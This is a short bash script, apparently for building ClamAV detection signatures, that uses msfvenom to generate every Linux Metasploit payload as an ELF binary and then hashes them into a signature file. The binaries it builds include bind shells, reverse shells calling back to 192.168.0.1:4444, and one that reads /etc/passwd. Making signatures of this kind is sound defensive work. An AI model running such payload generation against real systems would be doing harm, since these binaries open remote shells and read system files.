#!/bin/bash
#
# install metasploit and clamav:
# apt-get update && apt-get install -y metasploit-framework clamav

for p in $( msfvenom --list payloads | grep -i linux | grep -i bind | cut -f5 -d' ' )
do
    #echo $p
    name="${p////-}" #replace / with - for file name
    echo $name
    #msfvenom -p $p lhost=192.168.0.1 lport=4444 -f elf -o $name
    msfvenom -p $p lport=4444 -f elf -o $name
done

for p in $( msfvenom --list payloads | grep -i linux | grep -i reverse | cut -f5 -d' ' )
do
    #echo $p
    name="${p////-}" #replace / with - for file name
    echo $name
    msfvenom -p $p lhost=192.168.0.1 lport=4444 -f elf -o $name
    #msfvenom -p $p lport=4444 -f elf -o $name
done


for p in $( msfvenom --list payloads | grep -i linux | grep -i -v -E 'bind|reverse' | cut -f5 -d' ' )
do
    #echo $p
    name="${p////-}" #replace / with - for file name
    echo $name
    msfvenom -p $p -f elf -o $name
done

msfvenom -p linux/armle/exec cmd=whoami -f elf -o linux-armle-exec
msfvenom -p linux/mipsbe/exec cmd=whoami -f elf -o linux-mipsbe-exec
msfvenom -p linux/mipsle/exec cmd=whoami -f elf -o linux-mipsle-exec
msfvenom -p linux/x86/read_file path=/etc/passwd -f elf -o linux-x86-read_file

sigtool --md5 * > msf_linux_payloads.hdb